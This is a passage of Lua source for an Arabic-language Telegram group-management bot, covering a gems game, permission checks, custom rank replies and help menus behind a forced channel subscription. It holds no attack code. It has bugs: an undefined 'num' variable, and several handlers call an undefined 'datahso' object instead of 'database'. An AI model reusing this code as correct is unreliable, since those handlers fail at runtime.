send(msg.chat_id_, msg.id_, '┐ هلو عمري ↝ ٭ \n┘ ارسل الي عدد المجوهرات الان') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف مجوهرات (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_,"┐ هلو عمري ↝ ٭ \n┘ تم اضافة ◞ ["..Num..'](t.me/R_IQ9) ◜ مجوهرات ✓ ٭')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) 
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n٭ 𖤓┆تم اضافة ◞ ["..num..'](t.me/R_IQ9) ◜ من الرسائل ↝ ٭')  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text == 'مجوهراتي' or text == 'مجوهراتي' then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
local Num = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = '٭ 𖤓┆لم تلعب اي لعبة للحصول على المجوهرات ☓◜'
else
Text = '٭ 𖤓┆عدد مجوهراتك ◃ ◞ ['..Num..'](t.me/R_IQ9) ◜.'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع مجوهراتي (%d+)$") or text and text:match("^بيع مجوهراتي (%d+)$") then
local NUMPY = text:match("^بيع مجوهراتي (%d+)$") or text:match("^بيع مجوهراتي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ?? •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n✥┆لا تستطيع البيع اقل من ◞[1](t.me/R_IQ9)◜ ◃") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'\n┐ ليس لديك مجوهرات 𖥣 ٭\n┤ لكسب المجوهرات  𖥣 ٭\n┘ ارسل الالعاب وابدأ اللعب  𖥣 ٭') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n┐ ليس لديك مجوهرات 𖥣 ٭\n┤ لكسب المجوهرات  𖥣 ٭\n┘ ارسل الالعاب وابدأ اللعب  𖥣 ٭') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'┐ تم خصم ◞['..NUMPY..'](t.me/R_IQ9)◜ من مجوهراتك ✓ ٭\n┘ تم اضافة ◞['..(NUMPY * 50)..'](t.me/R_IQ9)◜ رسالة الى رسائلك ✓ ٭')
end 
return false 
end
if text == 'فحص البوت' and Manager(msg) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = 'ꪜ' else info = '✘' end
if Json_Info.result.can_delete_messages == true then
delete = 'ꪜ' else delete = '✘' end
if Json_Info.result.can_invite_users == true then
invite = 'ꪜ' else invite = '✘' end
if Json_Info.result.can_pin_messages == true then
pin = 'ꪜ' else pin = '✘' end
if Json_Info.result.can_restrict_members == true then
restrict = 'ꪜ' else restrict = '✘' end
if Json_Info.result.can_promote_members == true then
promote = 'ꪜ' else promote = '✘' end 
send(msg.chat_id_,msg.id_,'\n܁༯┆هلو عمري  ↝'..'\n܁༯┆صلاحيات البوت هي ▿  ܰ'..'\n••━━━━━━━━━━━━━━━━•'..'\n܁༯┆تغير معلومات المجموعة ˼ '..info..' ˹'..'\n܁༯┆حذف الرسائل  ˼ '..delete..' ˹'..'\n܁༯┆حظر المستخدمين  ˼ '..restrict..' ˹'..'\n܁༯┆دعوة المستخدمين  ˼ '..invite..' ˹'..'\n܁༯┆ثتبيت الرسالة  ˼ '..pin..' ˹'..'\n܁༯┆اضافة مشرفين جدد  ˼ '..promote..' ˹')   
end
end
end
if text:match("^كول (.*)$") then
local txt = {string.match(text, "^(كول) (.*)$")}
send(msg.chat_id_, 0, txt[2], "md")
local id = msg.id_
local msgs = {
[0] = id
}
local chat = msg.chat_id_
delete_msg(chat, msgs)
end


------------------------------------------LOKRAND----------------------------------

if text and text:match("^تغير رد المطور (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد المطور الى ◃ "..Teext)
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد منشئ الاساسي (.*)$") 
database:set(bot_id.."BasicConstructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد المنشئ الاساسي الى ◃ ↝ ܰ"..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
database:set(bot_id.."Constructor:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد المنشئ الى ◃ "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد المدير الى ◃ "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد الادمن الى ◃ "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد المميز الى ◃ "..Teext)
end
if text and text:match("^تغير رد العضو (.*)$") and Manager(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"܁༯┆تم تغير رد العضو الى ◃ "..Teext)
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help'..msg.sender_user_id_)
database:set(bot_id..'help_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help1'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help1'..msg.sender_user_id_)
database:set(bot_id..'help1_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help2'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help2'..msg.sender_user_id_)
database:set(bot_id..'help2_text',text)
return false
end
end

if text and text:match("^(.*)$") then
if database:get(bot_id..'help3'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help3'..msg.sender_user_id_)
database:set(bot_id..'help3_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help4'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '??┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help4'..msg.sender_user_id_)
database:set(bot_id..'help4_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help5'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help5'..msg.sender_user_id_)
database:set(bot_id..'help5_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help6'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help6'..msg.sender_user_id_)
database:set(bot_id..'help6_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help7'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help7'..msg.sender_user_id_)
database:set(bot_id..'help7_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help8'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help8'..msg.sender_user_id_)
database:set(bot_id..'help8_text',text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'help9'..msg.sender_user_id_) == 'true' then
send(msg.chat_id_, msg.id_, '📮┇ تم حفظ الكليشه بنجاح')
database:del(bot_id..'help9'..msg.sender_user_id_)
database:set(bot_id..'help9_text',text)
return false
end
end

if text == 'استعاده الاوامر' and SudoBot(msg) then
database:del(bot_id..'help_text')
database:del(bot_id..'help1_text')
database:del(bot_id..'help2_text')
database:del(bot_id..'help3_text')
database:del(bot_id..'help4_text')
database:del(bot_id..'help5_text')
database:del(bot_id..'help6_text')
database:del(bot_id..'help7_text')
database:del(bot_id..'help8_text')
database:del(bot_id..'help9_text')
send(msg.chat_id_, msg.id_, '🔘┇ تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '܁༯┆ارسل كليشة الامر الان ◃ ↝ ܰ')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر م1' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م1')
database:set(bot_id..'help1'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م2' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م2')
database:set(bot_id..'help2'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م3' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م3')
database:set(bot_id..'help3'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م4' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م4')
database:set(bot_id..'help4'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م5' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م5')
database:set(bot_id..'help5'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م6' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م6')
database:set(bot_id..'help6'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م7' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م7')
database:set(bot_id..'help7'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م8' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م8')
database:set(bot_id..'help8'..msg.sender_user_id_,'true')
return false 
end

if text == 'تغير امر م9' and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '🔘┇ الان يمكنك ارسال الكليشه م9')
database:set(bot_id..'help9'..msg.sender_user_id_,'true')
return false 
end

if text == 'الاوامر' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local help_text = database:get(bot_id..'help_text')
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر البوت ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ م1 ◂ لعرض قائمة الحماية 
┤ م2 ◂ لعرض التفعيل و التعطيل
┤ م3 ◂ لعرض اوامر الوضع ٫ اضف 
┤ م4 ◂ لعرض اوامر الحذف 
┤ م5 ◂ لعرض اوامر التنزيل و الرفع
┤ م6 ◂ لعرض اوامر المجموعة
┤ م7 ◂ لعرض اوامر المطور
┤ م8 ◂ لعرض اوامر المطور الاساسي
┤ م9 ◂ لعرض اوامر الاعضاء
┘ م10 ◂ لعرض اوامر التحشيش
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,(help_text or Text)) 
return false
end
----------------------------------------------------------------------------
----------------------------------------------------------------------------
if text == 'م1' or text == 'م١' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ') 
return false
end
print(AddChannel(msg.sender_user_id_))
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر حماية المجموعة ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┤ قفل او فتح + الامر ▿
┤ بالكتم ◞بالتقييد ◞بالطرد 
┤╌╌╌╌╌╌╌╌╌╌܁ 
┤ الاضافه
┤ الدردشه
┤ الدخول
┤ البوتات
┤ الاشعارات
┤ التعديل
┤ تعديل الميديا
┤ الروابط
┤ المعرفات
┤التاك
┤ الشارحه
┤ الملصقات
┤ المتحركه
┤ الفيديو
┤ الصور
┤ الالعاب
┤ الاغاني
┤ الصوت
┤ الكيبورد
┤ التوجيه
┤ الملفات
┤ السيلفي
┤ الجهات
┤ الماركداون
┤ الكلايش
┤ التكرار
┤ الفارسيه
┤ الفشار
┤ الانكليزيه
┘ الانلاين
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م2' or text == 'م٢' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر التفعيل + التعطيل ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆تفعيل ܊ تعطيل + الامر ▿
┤ اطردني
┤ صيح
┤ ضافني
┤ الرابط 
┤ الحظر
┤ الرفع
┤ الرفع 
┤ الايدي
┤ الالعاب
┤ ردود المطور
┤ الترحيب
┤ ردود المدير
┤ الردود
┘ صورتي
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م3' or text == 'م٣' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر الوضع ٫ اضف ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆اضف + الامر ▿
┤ امر 
┤ رد
┤ صلاحيه 
┤╌╌╌╌╌╌╌╌╌╌܁ 
┤ ܁ NO.2
┆ضع + الامر ▿
┤ اسم 
┤ رابط 
┤ ترحيب 
┤ قوانين
┤ صوره
┤ وصف 
┘ تكرار + العدد
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م4' or text == 'م٤' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'??┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر المسح ٫ الحذف ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆مسح + الامر ▿
┤ الايدي 
┤ الادمنيه
┤ المميزين
┤ المنشئين
┤ المدراء
┤ ردود المدير 
┤ البوتات 
┤ الصلاحيه 
┤ المحذوفين 
┤ قائمه المنع
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.2
┆حذف + الامر ▿
┤ امر
┘ الاوامر المضافه
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end

----------------------------------------------------------------------------
if text == 'م5' or text == 'م٥' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر التنزيل + الرفع ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆تنزيل + رفع ▿
┤ مدير
┤ ادمن
┤ مميز
┤ منشى
┤ منشى اساسي
┤ ادمن بالكروب
┤ ادمن بكل الصلاحيات
┤ القيود
┤ تنزيل جميع الرتب ٭ تنزيل الرتبه
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.2
┆ اوامر التغير ▿
┤ تغير رد المطور + الاسم
┤ تغير رد منشئ اساسي + الاسم
┤ تغير رد منشئ + الاسم
┤ تغير رد المدير + الاسم 
┤ تغير رد الادمن + الاسم 
┤ تغير رد المميز + الاسم 
┤ تغير رد العضو + الاسم
┤ تغير امر الاوامر
┘ تغير امر م 1 الى حد م 10
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
----------------------------------------------------------------------------
if text == 'م6' or text == 'م٦' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = datahso:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..datahso:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر المجموعة  ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ استعاده الاوامر 
┤ الادمنيه 
┤ تاك الادمنيه
┤ كشف القيود
┤ تعين الايدي
┤ تنظيف + العدد
┤ تنزيل الكل 
┤ منع + الرد ܊ صور ٭ متحركه ٭ ملصق ܊ 
┤ المميزين 
┤ حظر ܊ الغاء حظر 
┤ المحظورين 
┤ كتم ܊ الغاء كتم
┤ المكتومين 
┤ تقيد + المده + يوم
┤ تقيد + المده + ساعه
┤ تقيد + المده + دقيقه
┤ كتم + المده + يوم
┤ كتم + المده + ساعه
┤ كتم + المده + دقيقه
┤ تقيد ܊ الغاء تقيد
┤ طرد 
┤  تثبيت ܊ الغاء تثبيت
┤الترحيب 
┤ كشف البوتات 
┤ الصلاحيات 
┤ كشف برد ܊ بمعرف
┤ تاك للكل
┤ اعدادات المجموعه 
┤ عدد الكروب
┤ ردود المدير 
┤ اسم البوت + الرتبه
┤ الاوامر المضافه 
┘ قائمه المنع
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م7' or text == 'م٧' then
if not Sudo(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = datahso:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'??┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..datahso:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر مطور البوت ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ تفعيل ܊ تعطيل
┤ المجموعات ܊ المشتركين
┤ رفع ܊ تنزيل ٭ منشى اساسي ٭
┤ مسح الاساسين
┤ مسح المنشئين الاساسين
┤ مسح المنشئين
┤ اسم البوت + غادر
┤ ردود المطور
┤ رفع ܊ تنزيل ٭ مميز عام ٭
┤ مسح المميزين عام
┤ مسح المميز عام
┘ اذاعه ܊ اذا كان المطور الاساسي مفعلها
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م8' or text == 'م٨' then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا الاوامر هذا لا تخصك ↝ ܰ ') 
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = datahso:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..datahso:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر مطور الاساسي ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1 
┤ تفعيل ܊ تعطيل
┤ المجموعات ܊ المشتركين
┤ رفع ܊ تنزيل ٭ منشى اساسي ٭
┤ مسح الاساسين
┤ مسح المنشئين الاساسين
┤ مسح المنشئين
┤ مسح المطورين 
┤ المطورين 
┤ رفع ܊ تنزيل ٭ مطور ٭
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.2
┤ اسم البوت + غادر 
┤ اسم البوت + الرتبه 
┤ تحديث السورس 
┤ حظر عام 
┤ كتم عام 
┤ الغاء العام 
┤ قائمه العام 
┤ جلب نسخة الاحتياطيه
┤ رفع نسخه الاحتياطيه
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.3
┤ اذاعه 
┤ اذاعه خاص 
┤ اذاعه بالتوجيه 
┤ اذاعه بالتوجيه خاص 
┤ اذاعه بالتثبيت 
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.4
┤ جلب نسخه البوت 
┤ رفع نسخه البوت 
┤ ضع عدد الاعضاء + العدد
┤ ضع كليشه مطور 
┤ تفعيل ܊ تعطيل الاذاعه 
┤ تفعيل ܊ تعطيل البوت الخدمي
┤ تفعيل ܊ تعطيل التواصل 
┤ تغير اسم البوت 
┤ اضف ܊ حذف رد للكل
┤ ردود المطور 
┤ مسح ردود المطور
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.5
┤ الاشتراك الاجباري
┤ تعطيل الاشتراك الاجباري
┤ تفعيل الاشتراك الاجباري
┤ حذف رساله الاشتراك
┤ تغير رساله الاشتراك
┤ تغير الاشتراك
┤╌╌╌╌╌╌╌╌╌╌܁
┤ ܁ NO.6
┤ الاحصائيات 
┤ المشتركين
┤ المجموعات
┤ السيرفر ܊ Server
┤ تفعيل ܊ تعطيل المغادره 
┤ تنظيف المشتركين 
┘ تنظيف الكروبات
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/R_IQ9) 𖥠 .
]]
send(msg.chat_id_, msg.id_,Text) 
return false
end
----------------------------------------------------------------------------
if text == 'م9' or text == 'م٩' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = datahso:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'👥┇ عذراً عليك الاشتراك في القناة\n📡┇قناة الاشتراك ['..datahso:get(bot_id..'add:ch:username')..']')
end
return false
end
Text = [[
܁༯┆ اهلا بيك عمري ↝ . 
܁༯┆اوامر الاعضاء ▾ . 
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ ܁ NO.1
┆لعرض معلوماتك ▿
┤ ايديي 
┤ اسمي
┤ رسائلي
┤ مسح رسايلي 
┤ رتبتي 
┤ سحكاتي
┤ مسح سحكاتي 
┤الرتبه ܊ بالرد او بالمعرف ܊
┤ الحساب + ايدي الشخص
┤ ╌╌╌╌╌╌╌╌╌╌ ܁ 
┤ ܁ NO.2
┆لعرض اوامر المجموعه ▿
┤ الرابط 
┤ القوانين
┤ الترحيب 
┤ ايدي
┤ اطردني
